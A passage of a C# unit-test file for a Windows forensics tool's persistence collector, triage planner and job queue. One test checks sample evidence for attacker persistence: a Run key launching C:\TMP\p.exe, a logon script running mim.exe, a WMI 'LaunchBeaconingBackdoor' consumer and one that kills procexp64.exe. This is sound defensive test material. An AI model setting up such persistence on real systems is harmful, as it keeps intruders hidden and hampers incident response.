    }

    [Fact]
    public void Command_line_entry_point_writes_output_and_reports_missing_roots()
    {
        using var t = new TempDir();
        var sw = new StringWriter();
        PersistenceCollector.RunCommandLine(new[] { "--root", t.Path }, sw).Should().Be(1, "--out is required");
        var empty = Path.Combine(t.Path, "empty");
        Directory.CreateDirectory(empty);
        PersistenceCollector.RunCommandLine(new[] { "--source", empty, "--out", Path.Combine(t.Path, "o") }, sw).Should().Be(1);
        sw.ToString().Should().Contain("no Windows system root");

        var root = BuildEvidence(Path.Combine(t.Path, "src", "C"));
        var o = Path.Combine(t.Path, "case", "Persistence", "EzHub");
        var w = new StringWriter();
        PersistenceCollector.RunCommandLine(new[] { "--source", Path.Combine(t.Path, "src"), "--out", o }, w, opener: new MapOpener()).Should().Be(0);
        File.Exists(Path.Combine(o, PersistenceCollector.MainCsv)).Should().BeTrue();
        w.ToString().Should().Contain("SOFTWARE could not be read").And.Contain("Scheduled tasks: 2");
        PersistenceCollector.HasWindowsSystem(root).Should().BeTrue();
        PersistenceCollector.HasWindowsSystem(empty).Should().BeFalse();
    }

    [Fact]
    public void Real_sample_evidence_when_present()
    {
        var root = Path.Combine(RepoRoot(), "samples", "C");
        if (!File.Exists(Path.Combine(root, "Windows", "System32", "config", "SOFTWARE"))) return; // samples\ is git-ignored
        var r = new PersistenceCollector().Collect(root);
        r.Entries.Should().Contain(e => e.Category == PersistenceCategory.RunKeys && e.EntryName == "UpdateSvc" && e.Command.StartsWith(@"C:\TMP\p.exe"));
        r.Entries.Should().Contain(e => e.Category == PersistenceCategory.LogonScripts && e.User == "Testuser" && e.Command.StartsWith(@"C:\TMP\mim.exe"));
        var go = r.Entries.Single(e => e.EntryName == @"\GameOver");
        go.TaskRegisteredUtc!.Value.Should().BeCloseTo(new DateTime(2025, 4, 15, 9, 4, 43, DateTimeKind.Utc), TimeSpan.FromSeconds(1));
        r.Wmi.Should().Contain(w => w.ConsumerName == "LaunchBeaconingBackdoor" && w.FilterQuery.Contains("__TimerEvent"));
        r.Wmi.Should().Contain(w => w.ConsumerName == "KillProcess" && w.FilterQuery.Contains("procexp64.exe"));
    }

    internal static string RepoRoot()
    {
        var d = new DirectoryInfo(AppContext.BaseDirectory);
        while (d != null && !File.Exists(Path.Combine(d.FullName, "EzForensics.sln"))) d = d.Parent;
        return d?.FullName ?? AppContext.BaseDirectory;
    }

    internal static Dictionary<string, string> Hashes(string dir) =>
        Directory.EnumerateFiles(dir, "*", SearchOption.AllDirectories).OrderBy(f => f, StringComparer.Ordinal)
            .ToDictionary(f => f, f => Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(f))) + File.GetLastWriteTimeUtc(f).Ticks);
}

public class PersistenceTriageTests
{
    private static JobQueue NewQueue()
    {
        var prev = SynchronizationContext.Current;
        SynchronizationContext.SetSynchronizationContext(null);
        try { return new JobQueue(new FakeLocator(FakeToolPaths.Exe), 2, TimeSpan.FromSeconds(60)); }
        finally { SynchronizationContext.SetSynchronizationContext(prev); }
    }

    [Fact]
    public void Triage_plans_only_the_builtin_job_per_system()
    {
        using var t = new TempDir();
        var root = PersistenceCollectorTests.BuildEvidence(Path.Combine(t.Path, "C"));
        Directory.CreateDirectory(Path.Combine(root, "Users", "alice"));
        File.WriteAllText(Path.Combine(root, "Users", "alice", "NTUSER.DAT"), "regf");
        Directory.CreateDirectory(Path.Combine(root, "Users", "Default"));
        File.WriteAllText(Path.Combine(root, "Users", "Default", "NTUSER.DAT"), "regf");
        var caseDir = Path.Combine(t.Path, "case");
        var layout = SourceLayoutDetector.Detect(t.Path);
        var roots = PersistenceTriage.SystemRoots(layout);
        roots.Should().Equal(root);

        var plan = PersistenceTriage.Plan(roots, caseDir, @"C:\app\EzForensics.exe");
        plan.Should().HaveCount(1);
        var builtin = plan[0];
        builtin.SelectedByDefault.Should().BeTrue();
        builtin.RequiresAdmin.Should().BeFalse();
        // Case layout v2: the collector writes into its staging folder; files are published to <case>\<Host>\Persistence.
        var host = TriagePlanner.HostFolder(ArtifactScanner.SystemFor(root, readHive: false).HostName);
        builtin.Spec.Args.Should().Equal(PersistenceCollector.Switch, "--root", root, "--out", builtin.Spec.Output!.StagingDir);
        builtin.Spec.OutputDir.Should().Be(Path.Combine(caseDir, host, "Persistence"));
        builtin.Spec.Output.ArtifactName.Should().Be("Persistence");
        builtin.Spec.Provenance!.SystemRoot.Should().Be(root);
        builtin.Spec.Category.Should().Be("Persistence");
        // No Windows system at all: nothing planned.
        var plain = Path.Combine(t.Path, "plain");
        Directory.CreateDirectory(plain);
        PersistenceTriage.SystemRoots(SourceLayoutDetector.Detect(plain)).Should().BeEmpty();
    }

    [Fact]
    public void Authenticode_rejects_unsigned_files()
    {
        if (!OperatingSystem.IsWindows()) return;
        var v = new AuthenticodeVerifier().Verify(FakeToolPaths.Exe);
        v.Trusted.Should().BeFalse();
        var notepad = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "notepad.exe");
        if (File.Exists(notepad))
        {
            // notepad is catalog-signed (no embedded signature) on recent Windows: either way it must not crash.
            _ = new AuthenticodeVerifier().Verify(notepad);
        }
    }

    [Fact]
    public async Task Job_preprocess_failure_skips_the_process_and_finally_always_runs()
    {
        using var t = new TempDir();
        int finals = 0;
        var q = NewQueue();
        var spec = new JobSpec("T", "EzForensics.FakeTool.exe", new[] { "--lines", "1" }, Path.Combine(t.Path, "o"), "t", "Test",
            PreProcess: (_, _) => throw new InvalidOperationException("no view"), Finally: _ => Interlocked.Increment(ref finals));
        var ok = spec with { Label = "ok", OutputDir = Path.Combine(t.Path, "o2"), PreProcess = (c, _) => { c.Log("prep"); return Task.CompletedTask; } };
        var j1 = q.Enqueue(spec, t.Path);
        var j2 = q.Enqueue(ok, t.Path);
        await q.WhenAllAsync();
        j1.State.Should().Be(JobState.Failed);
        j1.StatusReason.Should().Be("Preparation failed: no view");
        j1.ExitCode.Should().BeNull();
        j2.State.Should().Be(JobState.Succeeded);
        File.ReadAllText(j2.LogPath!).Should().Contain("prep").And.Contain("line 1");
        finals.Should().Be(2);
    }
}
